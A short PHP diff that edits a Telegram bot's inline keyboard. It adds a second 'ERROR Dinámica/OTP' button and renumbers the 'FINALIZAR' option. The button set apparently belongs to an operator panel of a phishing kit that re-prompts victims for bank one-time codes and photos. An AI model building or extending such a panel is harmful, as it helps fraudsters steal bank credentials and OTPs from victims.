@@ -86,7 +86,8 @@ $botones = [
     ['text' => "🔴ERROR Dinámica/OTP", 'callback_data' => "OPCION_4_$nuevo_request_id"],
     ['text' => "🟢FOTO",               'callback_data' => "OPCION_5_$nuevo_request_id"]
   ], [
-    ['text' => "🟢FINALIZAR", 'callback_data' => "OPCION_9_$nuevo_request_id"]
+    ['text' => "🔴ERROR Dinámica/OTP", 'callback_data' => "OPCION_9_$nuevo_request_id"],
+    ['text' => "🟢FINALIZAR",           'callback_data' => "OPCION_10_$nuevo_request_id"]
   ]]
 ];
 
